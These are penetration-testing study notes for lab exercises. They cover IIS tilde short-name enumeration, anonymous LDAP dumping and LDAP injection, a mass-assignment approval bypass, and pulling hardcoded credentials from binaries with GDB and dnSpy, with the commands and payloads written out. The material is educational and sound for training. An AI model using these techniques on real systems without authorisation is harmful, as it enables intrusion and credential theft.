* **The Core Mechanism:** For backward compatibility, older Windows file systems generate an alternate, shortened name for every file or directory created (e.g., `SecretDocuments` becomes `SECRET~1`, and `longfilename.aspx` becomes `LONGFI~1.ASP`).
* **The Vulnerability:** By sending targeted HTTP requests containing the tilde (`~`) character, an attacker can infer whether a short file or directory starting with specific letters exists based on distinct web server error/status responses.
* **The Attack Pipeline:** 1. Identify an exposed IIS instance via footprinting.
  2. Run an automated scanner to reconstruct the first 6 letters of hidden files and 3 letters of extensions.
  3. Generate a highly customized local wordlist using string utilities based on those discovered characters.
  4. Perform targeted fuzzing to expand the short 8.3 names into full, web-accessible URLs.

### Command Reference Matrix

| **Command**                                                                    | **Target Phase**      | **Operational Objective**                                                   |
| ------------------------------------------------------------------------------ | --------------------- | --------------------------------------------------------------------------- |
| `nmap -p- -sV -sC --open 10.129.224.91`                                        | Footprinting & Triage | Discovers open HTTP endpoints and fingerprints the Microsoft IIS version.   |
| `java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/`               | Tilde Enumeration     | Automates character guessing to pull short file and folder signatures.      |
| `egrep -r ^transf /usr/share/wordlists/* \| sed 's/^[^:]*://' > /tmp/list.txt` | Wordlist Generation   | Extracts words starting with the leaked prefix and cleans them for fuzzing. |
| `gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp`        | Target Verification   | Fuzzes the target with the custom list to resolve full file identities.     |

### Granular Command Breakdowns

#### 1. Nmap Service Mapping

Bash

```
nmap -p- -sV -sC --open 10.129.224.91
```

* **`-p-`**: Scans all 65,535 TCP ports to catch non-standard configurations.
* **`-sV -sC`**: Runs service version detection and default scripts to pull banners (e.g., identifying `Microsoft IIS 7.5`).
* **`--open`**: Ignores closed or filtered ports, showing only active attack vectors.

#### 2. Automated Tilde Scanner Execution

Bash

```
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

* **`java -jar`**: Runs the compiled Java archive application binary.
* **`0 5`**: Diagnostic tuning parameters required by this specific tool wrapper to dictate request mechanics and validation rules.
* **`http://10.129.204.231/`**: The target base URL context where the 8.3 filename checking strings will be iteratively injected.

#### 3. Wordlist Extraction Pipeline

Bash

```
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

* **`egrep -r ^transf`**: Searches recursively (`-r`) through all local wordlists for lines starting exactly (`^`) with the string `transf` (the fragment leaked by the scanner).
* **`|`**: Pipes the results (which include filename paths like `/usr/share/wordlists/dirb/small.txt:transfer`) to the cleaner tool.
* **`sed 's/^[^:]*://'`**: A stream editor script that trims off everything up to the first colon (`:`), leaving only clean words.
* **`> /tmp/list.txt`**: Saves the resulting deduplicated strings into a pristine, target-specific list.

#### 4. Focused Gobuster Fuzzing

Bash

```
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

* **`dir`**: Sets Gobuster to web folder and file discovery mode.
* **`-w /tmp/list.txt`**: Feeds the newly generated, highly condensed prefix list to the scanner.
* **`-x .aspx,.asp`**: Appends specific extensions to every word payload during the scan to uncover the real filename that maps back to the `TRANSF~1` reference.

***

***

#### \*_LDAP?_

Lightweight Directory Access Protocol (LDAP) is a protocol used to talk to a centralized, hierarchical directory database. It manages network resources like users, computers, passwords, and groups.

* **The Catch:** LDAP is extremely fast for reading data, but it transmits data in cleartext by default unless encrypted via LDAPS (SSL/TLS) or StartTLS.

#### **LDAP Injection**

This vulnerability occurs when a web application takes user input (like a username or password) and places it directly into an LDAP query without sanitizing it.

* Attackers use special characters like the wildcard (`*`), logical AND (`&`), or logical OR (`|`) to alter the query logic.
* **Bypass Example:** Inputting `*` into a login form can make the query evaluate to true for any account, completely skipping password verification.

### **2. Directory Architecture Visualized**

To understand the commands below, it helps to understand how an LDAP directory tree organizes data:

* **`dc` (Domain Component):** The top level of the directory (e.g., `dc=slap,dc=htb` represents `slap.htb`).
* **`ou` (Organizational Unit):** Folders or groups inside the domain (e.g., `ou=people`).
* **`cn` (Common Name):** Individual objects or users inside a folder (e.g., `cn=admin`).

### **3. Full Command Breakdown**

#### **Phase 1: Initial Reconnaissance**

Before attacking LDAP, you must find if it is running on the target.

Bash

```
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```

* **`-p-`**: Scans all 65,535 TCP ports.
* **`-sC` / `-sV`**: Runs default vulnerability scripts and detects software version numbers (e.g., discovering `OpenLDAP 2.2.X` on port 389).
* **`--open`**: Filters the output to display only active, listening ports.
* **`--min-rate=1000`**: Speeds up the scan by sending a minimum of 1,000 packets per second.

#### **Phase 2: Anonymous LDAP Enumeration (Your Commands)**

If the LDAP server allows unauthenticated connections, you can map out its layout using an **anonymous bind** (`-x` with no username/password specified).

**Command A: Finding the Root Directory Name**

Bash

```
ldapsearch -H ldap://10.129.205.18:389 -x -b "" -s base namingContexts
```

* **`-H ldap://10.129.205.18:389`**: Connects to the target IP address on the default LDAP port.
* **`-x`**: Performs a "Simple Authentication" bind (anonymous since no credentials follow).
* **`-b ""`**: Specifies an empty Base DN, starting the query at the absolute root of the server.
* **`-s base`**: Sets the search scope to the base object only, preventing it from digging deeper yet.
* **`namingContexts`**: The exact attribute requested. It asks the server: _"What domain directories do you host?"_ (This reveals `dc=slap,dc=htb`).

**Command B: Dumping the Target Directory**

Bash

```
ldapsearch -H ldap://10.129.205.18:389 -x -b "dc=slap,dc=htb"
```

* **`-b "dc=slap,dc=htb"`**: Sets the search base to the exact domain component discovered in the previous step.
* Because no specific filters or attributes are defined at the end, this defaults to a full subtree search (`objectClass=*`), pulling down every visible user, group, and attribute allowed by the anonymous access policy.

#### **Phase 3: Authenticated Queries (Textbook Example)**

Once an administrative credential or valid user account is captured, you use authenticated flags to execute target-specific queries.

Bash

```
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

* **`-D "cn=admin,dc=example,dc=com"`**: The **Bind DN**. This defines the identity you are using to log in (authenticating as the administrator).
* **`-w secret123`**: Supplies the cleartext password (`secret123`) for the specified Bind DN.
* **`-b "ou=people,dc=example,dc=com"`**: Limits the scope of the search exclusively to the `people` organizational unit folder.
* **`"(mail=john.doe@example.com)"`**: The **Search Filter**. This tells the server to completely ignore other objects and return only records where the email attribute matches John Doe

***

***

#### **Web Mass Assignment Vulnerabilities**

**Web Mass Assignment** (also known as Parameter Binding or Auto-binding) occurs when a web framework automatically binds user-supplied input from an HTTP request directly to a database model or object without strict filtering.

While this feature saves developers time by letting them pass an entire form's data into the database at once, it introduces a critical flaw: if the application does not explicitly restrict which parameters the user is allowed to modify, an attacker can guess or discover hidden field names (like `admin`, `role`, or `status`) and inject them into the request to alter data or escalate privileges.

#### **How the Vulnerability Works**

1. **The Convenience Feature:** Modern frameworks allow a developer to write a single line of code to save user data: `User.new(params)`.
2. **The Attacker's Play:** An attacker intercepts the registration or profile update request using a tool like Burp Suite.
3. **The Parameter Injection:** They append an unauthorized attribute to the payload (e.g., changing `username=hacker` to `username=hacker&admin=true`).
4. **The Exploitation:** Because there is no whitelist defining what parameters are allowed, the backend processes the entire request payload blindly, granting the user administrative rights in the database.

#### **The Target Lab Scenario Breakdown (The Python App)**

The exercise presents a Python asset-management application with an administrative approval workflow.

**The Flaw in the Code:** When you register, the application checks if a parameter named `confirmed` exists in your incoming request form:

Python

```
try:
    if request.form['confirmed']:
        cond=True
except:
    cond=False
```

If `confirmed` is present, the variable `cond` is set to `True`. The application then inserts this value directly into the third column of the `users` database table:

Python

```
cur.execute('insert into users values(?,?,?)',(username,password,cond))
```

When logging in, the application checks that third column (`k`):

Python

```
if k: # If cond was True
    session['user']=i
    return redirect("/home") # Logged in successfully!
else:
    return render_template('login.html', value='Account is pending for approval')
```

**The Exploitation Step:** By default, the registration web form does not include a `confirmed` field, meaning normal users always get registered with `cond=False` (pending approval).

To bypass this restriction:

1. Intercept the registration POST request using **Burp Suite**.
2. Modify the body from `username=new&password=test` to include the hidden parameter: `username=new&password=test&confirmed=anyvalue`.
3. Send the request. The backend evaluates `request.form['confirmed']` as true, sets `cond=True` in the database, and creates an instantly approved account.

#### **Prevention**

To secure applications against mass assignment, developers must implement **Whitelisting** (often called _Strong Parameters_). Instead of accepting the entire input block, the application must explicitly define which specific fields a user is permitted to touch:

Ruby

```
# Example of forcing a whitelist
params.require(:user).permit(:username, :email) 
# Any extra fields like 'admin' or 'confirmed' sent by the client are completely ignored.
```

***

***

## **Attacking Applications Connecting to Services**

**Attacking Applications Connecting to Services**. When software interacts with external databases, APIs, or internal services, developers often leave hardcoded connection strings inside the compiled code. As a penetration tester, you can reverse-engineer or dynamically debug these applications to extract credentials, which frequently leads to privilege escalation or lateral movement.

Here is the tactical breakdown of the two methods covered in the text:

### **Method 1: Dynamic Analysis of Linux Binaries (ELF Files)**

When dealing with compiled Linux binaries (like `octopus_checker`), developers might construct strings in pieces, causing static analysis tools like `strings` to fail or show out-of-order text due to **endianness** (how bytes are ordered in memory). To bypass this, you use **Dynamic Analysis**—watching the program execute in real-time.

#### **The Workflow Breakdown:**

1.  **Initialize GDB with PEDA:**

    Bash

    ```
    gdb ./octopus_checker
    ```

    _GDB handles the debugging, while PEDA provides a cleaner, color-coded view of memory registers and assembly code._
2.  **Set the Style & Disassemble:**

    Code snippet

    ```
    gdb-peda$ set disassembly-flavor intel
    gdb-peda$ disas main
    ```

    _Switches the syntax to standard Intel format and lists the assembly code for the `main` function._
3. **Locate the Target Function:** Scanning the disassembled code reveals a call to `SQLDriverConnect@plt`. This is the exact function responsible for opening the database connection. It _must_ receive the connection string as an argument before executing.
4.  **Set a Breakpoint & Intercept:**

    Code snippet

    ```
    gdb-peda$ b *0x5555555551b0
    gdb-peda$ run
    ```

    _By placing a breakpoint (`b *<address>`) exactly at the memory address of the SQL connection call, you force the program to freeze right before it connects._
5. **Read the Registers:** When the program freezes, you inspect the CPU registers. In x86\_64 Linux architecture, arguments to functions are passed via registers (like RDI, RSI, RDX). As seen in the module example, the **RDX register** holds the entire, unencrypted string in memory: `RDX: 0x7fffffffda70 ("DRIVER={...};SERVER=localhost;UID=username;PWD=password;")`

### **Method 2: Decompiling .NET Assemblies (DLL Files)**

Windows applications often rely on **DLLs (Dynamically Linked Libraries)**. If a DLL is built using the `.NET` framework, it doesn't compile directly into raw machine code; instead, it compiles into **Intermediate Language (IL)**.

#### **The Workflow Breakdown:**

1. **Identify the Type:** Using tools like PowerShell's `Get-FileMetaData` or Linux's `file` command reveals the binary is a `.NET Framework` assembly.
2. **Decompile with dnSpy:** Because IL preserves massive amounts of the original program structure, tools like **dnSpy** can completely reconstruct the original C# or Visual Basic source code.
3. **Audit the Code:** By navigating the decompiled structure (such as `Controllers -> ColleagueController`), you can read the raw backend code directly, exposing hardcoded API endpoints, SQL connection strings, and administrative passwords without ever having to run the program

***

***
